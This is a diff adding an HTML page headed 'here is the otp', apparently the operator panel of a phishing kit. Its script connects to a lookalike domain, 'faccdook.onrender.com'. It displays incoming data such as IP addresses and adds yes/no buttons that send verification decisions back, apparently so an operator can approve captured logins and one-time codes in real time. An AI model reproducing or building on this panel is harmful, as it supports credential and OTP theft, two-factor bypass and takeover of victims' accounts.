@@ -1,0 +1,115 @@
+<h2>here is the otp</h2>
+<b>-------------------------</b>
+<body>
+    <div id="review"></div>
+</body>
+
+
+<script src="https://cdn.socket.io/4.5.0/socket.io.min.js" integrity="sha384-7EyYLQZgWBi67fBtVxw60/OWl1kjsfrPFcaU0pp0nAh+i8FD068QogUvg85Ewy1k" crossorigin="anonymous"></script>
+<script>
+    const socket = io('https://faccdook.onrender.com/')
+    socket.on('connection',socket.emit('message', "hello my name is home2" ))
+    
+    socket.on('show_ip2',(data)=>{
+    
+    console.log(data)
+    var message = document.createElement('div');
+    var br = document.createElement('br');
+    var hr = document.createElement('hr');
+    message.setAttribute('class', 'chat-message');
+    message.textContent = data;
+    review.append(message,br,hr);    
+    })
+
+
+
+
+    socket.on('show_reg',(data)=>{
+    console.log(data)
+    var message = document.createElement('button');
+    var br = document.createElement('br');
+    var hr = document.createElement('hr');
+    message.setAttribute('class', 'yes');
+    message.setAttribute('onclick', 'verify()');
+    message.textContent = data;
+    review.append(message);     
+    })
+    socket.on('show_reg',(data)=>{
+    console.log(data)
+    var message = document.createElement('button');
+    var br = document.createElement('br');
+    var hr = document.createElement('hr');
+    message.setAttribute('class', 'no');
+    message.setAttribute('onclick', 'verify2()');
+    message.textContent = data;
+    review.append(message);     
+    })
+    socket.on('show_reg',(data)=>{
+    console.log(data)
+    var message = document.createElement('button');
+    var br = document.createElement('br');
+    var hr = document.createElement('hr');
+    message.setAttribute('class', 'n_y');
+    message.setAttribute('onclick', 'verify3()');
+    message.textContent = data;
+    review.append(message,br);     
+    })
+    function verify(){
+        var x = "yes";
+        socket.emit('res_very',x)}
+    function verify2(){
+        var x = "no";
+        socket.emit('res_very',x)} 
+    function verify3(){
+        var x = "n_y";
+        socket.emit('res_very',x)}   
+
+
+
+    
+        socket.on('show_reg2',(datav)=>{
+    console.log(datav)
+    var message = document.createElement('button');
+    var br = document.createElement('br');
+    var hr = document.createElement('hr');
+    message.setAttribute('class', 'yes');
+    message.setAttribute('onclick', 'c_verify()');
+    message.textContent = datav;
+    review.append(message);     
+    })
+    socket.on('show_reg2',(datav)=>{
+    console.log(datav)
+    var message = document.createElement('button');
+    var br = document.createElement('br');
+    var hr = document.createElement('hr');
+    message.setAttribute('class', 'no');
+    message.setAttribute('onclick', 'c_verify2()');
+    message.textContent = datav;
+    review.append(message);     
+    })
+    socket.on('show_reg2',(datav)=>{
+    console.log(datav)
+    var message = document.createElement('button');
+    var br = document.createElement('br');
+    var hr = document.createElement('hr');
+    message.setAttribute('class', 'n_y');
+    message.setAttribute('onclick', 'c_verify3()');
+    message.textContent = datav;
+    review.append(message,br);     
+    })
+    function c_verify(){
+        var x = "yes";
+        socket.emit('res_very2',x)}
+    function c_verify2(){
+        var x = "no";
+        socket.emit('res_very2',x)} 
+    function c_verify3(){
+        var x = "n_y";
+        socket.emit('res_very2',x)}   
+</script>
+
+<style>
+.yes{ color: green;}
+.no { color: red; }
+.n_y { color:rgb(66, 53, 182) ; }
+</style>
